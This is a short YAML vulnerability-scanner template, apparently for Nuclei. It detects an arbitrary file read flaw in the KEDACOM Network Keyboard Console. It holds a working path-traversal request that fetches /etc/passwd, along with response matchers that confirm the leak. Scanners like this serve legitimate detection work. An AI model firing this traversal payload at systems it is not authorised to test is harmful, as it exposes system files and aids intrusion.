id: kedacom-nkc-anyfile-read
info:
  name: KEDACOM Network Keyboard Console Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "/../../../../../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: word
        part: header
        words:
          - "/etc/passwd"
          - "kedacom"
